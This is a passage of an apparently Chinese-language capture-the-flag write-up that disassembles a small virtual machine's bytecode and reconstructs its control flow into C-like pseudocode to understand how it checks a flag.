class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><code class="hljs c++">_200: state[<span class="hljs-number">4</span>] = <span class="hljs-number">5000</span>;<br>_210: state[<span class="hljs-number">0</span>] = <span class="hljs-number">13200</span>;<br>_221: <span class="hljs-keyword">goto</span> _337;<br>_226: state[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>_233: <span class="hljs-keyword">goto</span> _500;<br>_238: <span class="hljs-keyword">goto</span> _1262;<br>_244: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _653;<br>== block end ==<br>_253: state[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>== block end ==<br>_261: state[<span class="hljs-number">3</span>] = state[<span class="hljs-number">0</span>];<br>_267: state[<span class="hljs-number">3</span>] = state[<span class="hljs-number">2</span>];<br>_273: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">3</span>] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _253;<br>_281: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1</span>;<br>_288: state[<span class="hljs-number">3</span>] = state[<span class="hljs-number">2</span>];<br>_294: state[<span class="hljs-number">3</span>] *= state[<span class="hljs-number">3</span>];<br>_300: state[<span class="hljs-number">3</span>] -= state[<span class="hljs-number">0</span>];<br>_306: state[<span class="hljs-number">3</span>] -= <span class="hljs-number">1</span>;<br>_313: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">3</span>] &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _261;<br>== block end ==<br>_322: a52cS[state[<span class="hljs-number">4</span>]] = state[<span class="hljs-number">0</span>];<br>_329: state[<span class="hljs-number">4</span>] += <span class="hljs-number">2</span>;<br>== block end ==<br>_337: state[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>_344: state[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>_351: <span class="hljs-keyword">goto</span> _261;<br>_356: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _322;<br>_364: state[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>_371: state[<span class="hljs-number">1</span>] = <span class="hljs-number">13600</span>;<br>_382: state[<span class="hljs-number">1</span>] -= state[<span class="hljs-number">0</span>];<br>_388: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _337;<br>== block end ==<br>_397: state[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>== block end ==<br>_405: state[<span class="hljs-number">0</span>] /= <span class="hljs-number">2</span>;<br>== block end ==<br>_413: state[<span class="hljs-number">0</span>] *= <span class="hljs-number">3</span>;<br>_420: state[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>== block end ==<br>_428: state[<span class="hljs-number">1</span>] = state[<span class="hljs-number">0</span>];<br>_434: state[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;<br>_441: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _405;<br>_449: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _413;<br>_457: <span class="hljs-keyword">goto</span> _470;<br>_462: state[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>== block end ==<br>_470: state[<span class="hljs-number">1</span>] = state[<span class="hljs-number">0</span>];<br>_476: state[<span class="hljs-number">1</span>] -= <span class="hljs-number">1</span>;<br>_483: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _397;<br>_491: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _428;<br>== block end ==<br>_500: state[<span class="hljs-number">2</span>] = state[<span class="hljs-number">0</span>];<br>_506: state[<span class="hljs-number">2</span>] += <span class="hljs-number">4096</span>;<br>_516: state[<span class="hljs-number">4</span>] = a52cS[state[<span class="hljs-number">2</span>]];<br>_522: state[<span class="hljs-number">4</span>] &amp;= <span class="hljs-number">255</span>;<br>_531: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">4</span>] &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _540;<br>== block end ==<br>_540: state[<span class="hljs-number">2</span>] = state[<span class="hljs-number">0</span>];<br>_546: state[<span class="hljs-number">2</span>] *= <span class="hljs-number">2</span>;<br>_553: state[<span class="hljs-number">2</span>] += <span class="hljs-number">5000</span>;<br>_563: state[<span class="hljs-number">2</span>] = a52cS[state[<span class="hljs-number">2</span>]];<br>_569: state[<span class="hljs-number">2</span>] &amp;= <span class="hljs-number">255</span>;<br>_578: state[<span class="hljs-number">4</span>] ^= state[<span class="hljs-number">2</span>];<br>_584: state[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>_591: state[<span class="hljs-number">2</span>] = state[<span class="hljs-number">0</span>];<br>_597: <span class="hljs-keyword">goto</span> _470;<br>_602: state[<span class="hljs-number">4</span>] += state[<span class="hljs-number">0</span>];<br>_608: state[<span class="hljs-number">4</span>] &amp;= <span class="hljs-number">255</span>;<br>_617: state[<span class="hljs-number">0</span>] = state[<span class="hljs-number">2</span>];<br>_623: state[<span class="hljs-number">2</span>] -= <span class="hljs-number">1</span>;<br>_630: state[<span class="hljs-number">2</span>] += <span class="hljs-number">4500</span>;<br>_640: a52cS[state[<span class="hljs-number">2</span>]] = state[<span class="hljs-number">4</span>];<br>_647: <span class="hljs-keyword">goto</span> _500;<br>== block end ==<br>_653: state[<span class="hljs-number">0</span>] = <span class="hljs-number">123456789</span>;<br>_668: state[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>_675: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_685: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_691: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_697: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_704: state[<span class="hljs-number">2</span>] += <span class="hljs-number">846786818</span>;<br>_719: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_725: state[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>_732: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_742: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_749: state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;<br>_756: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_766: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_772: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_778: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_785: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1443538759</span>;<br>_801: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_807: state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;<br>_814: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_824: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_831: state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>_838: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_848: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_854: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_860: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_867: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1047515510</span>;<br>_883: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_889: state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>_896: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_906: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_913: state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span>;<br>_921: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_931: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_937: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_943: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_950: state[<span class="hljs-number">2</span>] += <span class="hljs-number">359499514</span>;<br>_965: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1724461856</span>;<br>_981: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_987: state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span>;<br>_995: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1005: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_1012: state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span>;<br>_1020: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_1030: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1036: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_1042: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1049: state[<span class="hljs-number">2</span>] += <span class="hljs-number">241024035</span>;<br>_1064: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_1070: state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span>;<br>_1078: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1088: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_1095: state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span>;<br>_1103: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_1113: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1119: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_1125: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1132: state[<span class="hljs-number">2</span>] += <span class="hljs-number">222267724</span>;<br>_1147: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_1153: state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span>;<br>_1161: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1171: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>_1178: state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span>;<br>_1186: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span>;<br>_1196: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1202: state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>];<br>_1208: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1215: state[<span class="hljs-number">2</span>] += <span class="hljs-number">844096018</span>;<br>_1230: state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>];<br>_1236: state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span>;<br>_1244: state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span>;<br>_1254: a52cS[state[<span class="hljs-number">1</span>]] = state[<span class="hljs-number">2</span>];<br>== block end ==<br>_1262: state[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>_1269: state[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>_1276: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1286: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1292: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1299: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1374542625</span>;<br>_1315: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1686915720</span>;<br>_1331: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1129686860</span>;<br>_1347: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1353: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1359: state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;<br>_1366: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1376: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1382: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1389: state[<span class="hljs-number">2</span>] += <span class="hljs-number">842217029</span>;<br>_1404: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1483902564</span>;<br>_1420: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1426: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1432: state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>_1439: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1449: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1455: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1462: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1868013731</span>;<br>_1478: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1484: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1490: state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span>;<br>_1498: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1508: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1514: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1521: state[<span class="hljs-number">2</span>] += <span class="hljs-number">584694732</span>;<br>_1536: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1453312700</span>;<br>_1552: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1558: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1564: state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span>;<br>_1572: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1582: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1588: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1595: state[<span class="hljs-number">2</span>] += <span class="hljs-number">223548744</span>;<br>_1610: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1616: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1622: state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span>;<br>_1630: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1640: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1646: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1653: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1958883726</span>;<br>_1669: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1916008099</span>;<br>_1685: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1691: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1697: state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span>;<br>_1705: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1715: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1721: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1728: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1829937605</span>;<br>_1744: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1815356086</span>;<br>_1760: state[<span class="hljs-number">2</span>] += <span class="hljs-number">253836698</span>;<br>_1775: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1781: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>== block end ==<br></code></pre></td></tr></table></figure><p>注意 <code>== block end ==</code> 要返回到 goto 之前的地方。</p><p>重建控制流</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><code class="hljs c++">_200: state[<span class="hljs-number">4</span>] = <span class="hljs-number">5000</span>;<br>_210: state[<span class="hljs-number">0</span>] = <span class="hljs-number">13200</span>;<br><span class="hljs-keyword">do</span>&#123;<br>    _337: state[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    _344: state[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>    <br>    _261: state[<span class="hljs-number">3</span>] = state[<span class="hljs-number">0</span>];<br>    _267: state[<span class="hljs-number">3</span>] = state[<span class="hljs-number">2</span>];<br>    _273: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">3</span>] == <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _253;<br>    _281: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1</span>;<br>    _288: state[<span class="hljs-number">3</span>] = state[<span class="hljs-number">2</span>];<br>    _294: state[<span class="hljs-number">3</span>] *= state[<span class="hljs-number">3</span>];<br>    _300: state[<span class="hljs-number">3</span>] -= state[<span class="hljs-number">0</span>];<br>    _306: state[<span class="hljs-number">3</span>] -= <span class="hljs-number">1</span>;<br>    _313: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">3</span>] &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _261;<br>    _356: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>        _322: a52cS[state[<span class="hljs-number">4</span>]] = state[<span class="hljs-number">0</span>];<br>        _329: state[<span class="hljs-number">4</span>] += <span class="hljs-number">2</span>;<br>    &#125;<br>    _364: state[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;<br>    _371: state[<span class="hljs-number">1</span>] = <span class="hljs-number">13600</span>;<br>    _382: state[<span class="hljs-number">1</span>] -= state[<span class="hljs-number">0</span>];<br>&#125;<span class="hljs-keyword">while</span>(state[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span>);<br><br><br><br>_226: state[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// _233: goto _500;</span><br>_500: state[<span class="hljs-number">2</span>] = state[<span class="hljs-number">0</span>];<br>_506: state[<span class="hljs-number">2</span>] += <span class="hljs-number">4096</span>;<br>_516: state[<span class="hljs-number">4</span>] = a52cS[state[<span class="hljs-number">2</span>]]; <span class="hljs-comment">// read flag[i]</span><br>_522: state[<span class="hljs-number">4</span>] &amp;= <span class="hljs-number">255</span>;<br>_531: <span class="hljs-keyword">if</span> (state[<span class="hljs-number">4</span>] &gt; <span class="hljs-number">0</span>) &#123;<br>    _540: state[<span class="hljs-number">2</span>] = state[<span class="hljs-number">0</span>];<br>    _546: state[<span class="hljs-number">2</span>] *= <span class="hljs-number">2</span>; <br>    _553: state[<span class="hljs-number">2</span>] += <span class="hljs-number">5000</span>;<span class="hljs-comment">// (i * 2) + 5000</span><br>    _563: state[<span class="hljs-number">2</span>] = a52cS[state[<span class="hljs-number">2</span>]]; <span class="hljs-comment">// a52cS[(i * 2) + 5000]</span><br>    _569: state[<span class="hljs-number">2</span>] &amp;= <span class="hljs-number">255</span>;<br>    _578: state[<span class="hljs-number">4</span>] ^= state[<span class="hljs-number">2</span>]; <span class="hljs-comment">// state[2] 与 下标关系参考 tab3</span><br>    _584: state[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span>;       <span class="hljs-comment">// i&#x27; = i + 1</span><br>    _591: state[<span class="hljs-number">2</span>] = state[<span class="hljs-number">0</span>];  <span class="hljs-comment">// state[2] = i&#x27;</span><br>    <span class="hljs-comment">//_597: goto _470; // 这里的数据直接打断点获取。</span><br><br><br>    _602: state[<span class="hljs-number">4</span>] += state[<span class="hljs-number">0</span>]; <span class="hljs-comment">// state[0] 与 下标关系参考 tab2</span><br>    _608: state[<span class="hljs-number">4</span>] &amp;= <span class="hljs-number">255</span>;<br>    _617: state[<span class="hljs-number">0</span>] = state[<span class="hljs-number">2</span>];<br>    _623: state[<span class="hljs-number">2</span>] -= <span class="hljs-number">1</span>;<br>    _630: state[<span class="hljs-number">2</span>] += <span class="hljs-number">4500</span>;<br>    _640: a52cS[state[<span class="hljs-number">2</span>]] = state[<span class="hljs-number">4</span>];<br>    _647: <span class="hljs-keyword">goto</span> _500;<br>&#125;;<br><br><span class="hljs-comment">//_238: goto _1262;</span><br>_1262: state[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>_1269: state[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>_1276: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1286: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]]; <span class="hljs-comment">// plag[0]</span><br>_1292: state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>_1299: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1374542625</span>;<br>_1315: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1686915720</span>;<br>_1331: state[<span class="hljs-number">2</span>] += <span class="hljs-number">1129686860</span>;<br>_1347: state[<span class="hljs-number">1</span>] ^= state[<span class="hljs-number">2</span>];<br>_1353: state[<span class="hljs-number">0</span>] |= state[<span class="hljs-number">1</span>];<br>_1359: state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span>;<br>_1366: state[<span class="hljs-number">1</span>] += <span class="hljs-number">4500</span>;<br>_1376: state[<span class="hljs-number">1</span>] = a52cS[state[<span class="hljs-number">1</span>]];<br>_1382: state[<span class="hljs-number">2</span>] = <span 